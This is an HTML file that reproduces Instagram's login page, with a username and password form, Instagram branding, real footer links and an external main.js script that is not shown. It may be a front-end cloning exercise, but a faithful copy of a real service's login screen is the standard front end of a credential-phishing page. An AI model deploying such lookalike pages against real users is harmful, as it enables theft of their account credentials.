<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Login â€¢ Instagram</title>
    <link
      rel="stylesheet"
      href="https://stackpath.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css"
      integrity="sha384-HSMxcRTRxnN+Bdg0JdbxYKrThecOKuH5zCYotlSAcp1+c8xmyTe9GYg1l9a69psu"
      crossorigin="anonymous"
    />
    <link rel="stylesheet" href="style.css" type="text/css" />
    <script
      src="https://kit.fontawesome.com/49f6e3eb9c.js"
      crossorigin="anonymous"
    ></script>
  </head>
  <body>
    <div class="container">
      <div class="row">
        <div class="col-md-4 col-md-offset-4 main-wrapper text-center">
          <div class="logo">
            <img src="./logo.webp" alt="" />
          </div>
          <form class="input-fields">
            <input
              type="text"
              name="user_name"
              placeholder="Phone number, username, or email"
              id="username" class="userInputs"
            />
            <input
              type="password"
              name="password"
              id="password"
              placeholder="Password"
              class="userInputs"
            />
            <button class="btn-default">Log In</button>
          </form>

          <p class="gray">OR</p>
          <p class="fb-link">
            <a href="#"
              ><i class="fab fa-facebook-square"></i> Log in with Facebook</a
            >
          </p>
          <a
            href="https://www.instagram.com/accounts/password/reset/"
            class="forgot"
            >Forgot password?</a
          >
        </div>
      </div>

      <div class="row">
        <div class="col-md-4 col-md-offset-4 signup-container">
          <p>
            Don't have an account?
            <a href="https://www.instagram.com/accounts/emailsignup/"
              >Sign Up</a
            >
          </p>
        </div>
      </div>

      <div class="row">
        <div class="col-md-4 col-md-offset-4">
          <p class="text-center icons-p">Get the app.</p>
          <div class="col-md-2 appstore-icon">
            <a href="https://apps.apple.com/app/instagram/id389801252?vt=lo">
              <img src="./appstore.png" alt="" />
            </a>
          </div>
          <div class="col-md-2 google-icon">
            <a
              href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26ig_mid%3D1ABFF13D-D990-406F-BEBF-CBC1B3E39C2E%26utm_content%3Dlo%26utm_medium%3Dbadge"
            >
              <img src="googleplay.png" alt="" />
            </a>
          </div>
        </div>
      </div>

      <div class="row ftn">
        <div class="col-md-12">
          <a href="https://about.instagram.com/about-us">ABOUT</a>
          <a href="https://help.instagram.com/">HELP</a>
          <a href="https://about.instagram.com/blog/">PRESS</a>
          <a href="https://www.instagram.com/developer/">API</a>
          <a href="https://www.instagram.com/about/jobs/">JOBS</a>
          <a href="https://help.instagram.com/519522125107875">PRIVACY</a>
          <a href="https://help.instagram.com/581066165581870">TERMS</a>
          <a href="https://www.instagram.com/explore/locations/">LOCATIONS</a>
          <a href="https://www.instagram.com/directory/profiles/"
            >TOP ACCOUNTS</a
          >
          <a href="https://www.instagram.com/directory/hashtags/">HASHTAGS</a>
          <a href="">LANGUAGE</a>

          <span class="gray right-txt"
            >&copy; 2020 INSTAGRAM FROM FACEBOOK</span
          >
        </div>
      </div>
    </div>


    <script src="main.js"></script>
  </body>
</html>
